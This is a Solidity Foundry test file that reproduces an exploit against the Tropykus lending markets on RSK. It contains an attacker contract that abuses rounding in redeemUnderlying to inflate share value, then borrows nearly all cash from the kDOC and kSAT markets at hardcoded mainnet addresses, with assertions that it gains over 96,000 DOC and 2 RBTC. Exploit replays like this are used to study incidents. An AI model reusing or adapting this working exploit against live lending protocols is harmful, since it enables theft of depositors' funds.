// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "../interface.sol";

interface ITropykusMarket {
    function mint() external payable;
    function redeemUnderlying(
        uint256 amount
    ) external returns (uint256);
    function borrow(
        uint256 amount
    ) external returns (uint256);
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);
    function balanceOf(
        address account
    ) external view returns (uint256);
    function getCash() external view returns (uint256);
}

interface ITropykusComptroller {
    function enterMarkets(
        address[] calldata markets
    ) external returns (uint256[] memory);
}

contract TropykusShareHolder {
    ITropykusMarket private immutable market;
    address private immutable owner;

    constructor(
        ITropykusMarket _market
    ) {
        market = _market;
        owner = msg.sender;
    }

    function returnShares() external {
        require(msg.sender == owner, "not owner");
        market.transfer(owner, market.balanceOf(address(this)));
    }
}

contract TropykusAttacker {
    ITropykusMarket private constant K_SAT = ITropykusMarket(0xD2eC53E8DD00D204D3D9313AF5474Eb9f5188Ef6);
    ITropykusMarket private constant K_DOC = ITropykusMarket(0x544Eb90e766B405134b3B3F62b6b4C23Fcd5fDa2);
    ITropykusComptroller private constant COMPTROLLER =
        ITropykusComptroller(0x962308fEf8edFaDD705384840e7701F8f39eD0c0);

    function attack() external {
        TropykusShareHolder holder = new TropykusShareHolder(K_SAT);

        K_SAT.mint{value: 0.005 ether}();
        uint256 initialShares = K_SAT.balanceOf(address(this));
        K_SAT.transfer(address(holder), initialShares / 2);

        // The division in redeemUnderlying rounds down. Splitting the shares
        // lets the attacker leave the market with a near-zero exchange rate.
        require(K_SAT.redeemUnderlying(0.005 ether - 1) == 0, "redeem failed");
        holder.returnShares();
        K_SAT.mint{value: 0.005 ether - 1}();

        // Keep only enough of the inflated shares to collateralize the loans.
        uint256 collateralShares = 1_172_690_400_438_485_243_226;
        K_SAT.transfer(msg.sender, K_SAT.balanceOf(address(this)) - collateralShares);

        address[] memory markets = new address[](1);
        markets[0] = address(K_SAT);
        COMPTROLLER.enterMarkets(markets);

        require(K_DOC.borrow(K_DOC.getCash() - 1) == 0, "DOC borrow failed");
        require(K_SAT.borrow(K_SAT.getCash() - 1) == 0, "SAT borrow failed");
    }

    receive() external payable {}
}

contract TropykusExploitTest is Test {
    IERC20 private constant DOC = IERC20(0xe700691dA7b9851F2F35f8b8182c69c53CcaD9Db);

    function testExploit() public {
        vm.createSelectFork("https://public-node.rsk.co", 5_388_202);

        TropykusAttacker attacker = new TropykusAttacker();
        deal(address(attacker), 0.005 ether);
        attacker.attack();

        assertGt(DOC.balanceOf(address(attacker)), 96_000 ether);
        assertGt(address(attacker).balance, 2 ether);
    }
}
